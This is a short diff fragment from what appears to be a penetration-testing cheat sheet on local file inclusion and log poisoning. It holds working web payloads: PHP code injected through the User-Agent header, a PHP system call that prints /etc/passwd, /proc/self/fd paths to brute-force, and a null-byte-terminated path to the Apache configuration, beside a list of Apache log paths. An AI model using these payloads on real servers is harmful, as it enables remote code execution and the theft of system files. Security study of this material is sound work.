@@ -414,8 +414,15 @@ User-Agent: <?=phpinfo(); ?>
 ..
 <?php system('cat /etc/passwd');?>
 ```
+>next
+```
+/proc/self/fd/number (rannge 1,100)
+and
+User-Agent: <?=phpinfo(); ?>
+```
 >next log
 ```
+/etc/httpd/conf/httpd.conf%00
 /var/log/apache/access.log
 /var/log/apache/error.log
 /var/log/apache2/access.log
